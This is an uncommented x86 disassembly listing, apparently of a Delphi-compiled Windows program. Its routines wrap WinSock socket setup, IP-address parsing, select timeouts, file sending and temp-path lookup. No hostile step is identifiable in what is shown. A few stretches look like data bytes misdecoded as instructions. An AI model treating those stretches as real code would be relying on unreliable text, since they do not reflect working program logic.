lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4040a0
mov eax [ ebp - 0x8 ]
call sub_4725e0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4725e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4726d2
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40402c
retn
mov eax [ ebp - 0x10 ]
call sub_4725e0
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4725e0
test al al
jne r-xdata
mov bl 0x1
sub_4726e8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_472718
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_472760
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472767
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_472770
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_472795
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47279c
retn
sub_4729c0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4726e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4729e8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_472a7c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_408344
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_408344
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_408344
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_408344
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_404388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472a83
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
sub_472a8f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_472b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40405c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472b1e
lea eax [ ebp - 0x1c ]
call sub_404008
retn
sub_472b28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_4042c8
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_472718
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472ba0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_472718
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472bf0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_472014
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_472c4c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404200
or edx 0xffffffff
mov eax esi
call sub_472014
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_472c9c
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_404654
mov eax [ ebx ]
call sub_4042c8
push eax
mov eax [ ebx ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_4044c8
mov edx eax
mov eax ebx
call sub_404200
pop ebx
retn
sub_472ce4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_472d00
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_472d8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_40405c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472d92
lea eax [ ebp - 0x1c ]
call sub_404008
retn
sub_472d9c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_41a624
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_41a30c
add ebx 0x4
dec esi
jne r-xdata
sub_472dd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_472e6d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e74
lea eax [ ebp - 0xc ]
call sub_404008
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_41a468
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_472e7c
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402c40
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402c40
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402c40
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_472dd8
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_472dd8
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_472dd8
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_472d9c
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_472d9c
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_472d9c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472f94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_472fb0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_472718
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_47301c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_47303c
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0xc ] eax
sub_47309c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_473169
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403800#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408480
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473170
lea eax [ ebp - 0x10 ]
call sub_404008
retn
sub_473111
add [ eax ] eax
add [ eax ] al
cmp [ ecx + 0x40 ] 0x0
sbb eax 0x8b004731
inc ebp
cld
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473170
lea eax [ ebp - 0x10 ]
call sub_404008
retn
sub_47318f
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_473299
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40538c
xor eax eax
push ebp
push j_sub_4036d4#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404200
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_4053c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4732a0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40538c
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404200
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_473263
mov eax [ ebp - 0x4 ]
call sub_403234
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4732a0
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40538c
retn
sub_4732c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_47335e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_472014
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473365
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_47336c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_473388
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_47343e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_473421
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473428
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_473450
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_473513
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
mov eax [ ebp - 0x8 ]
call sub_408480
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
mov eax [ ebp - 0xc ]
call sub_408480
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
mov eax [ ebp - 0x10 ]
call sub_408480
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_473c90
mov eax [ ebp - 0x14 ]
call sub_408480
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47351a
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40402c
retn
sub_473538
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4735c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_472014
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_40405c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4735cd
lea eax [ ebp - 0x18 ]
call sub_404008
retn
sub_4735d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473666
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_472014
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_40405c
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47366d
lea eax [ ebp - 0x18 ]
call sub_404008
retn
sub_473678
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_473698
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_4736f2
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4736f9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_473700
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_47375a
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473761
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_473768
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_47379c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_47383d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_4721d8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405efc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473844
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_40905c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40405c
sub_47384c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473885
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47388c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_4738bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4738e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4738e8
retn
sub_473b20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_473b7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_404654
mov eax [ ebx ]
call sub_4044c8
push eax
mov eax [ ebx ]
call sub_4042c8
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_404654
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_473a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b86
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_473ba8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_473c71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404414
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407ff4
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407ff4
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_40460c
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404528
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_40405c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c78
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
push ebx
mov eax edi
call sub_4042c8
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404528
mov eax ebx
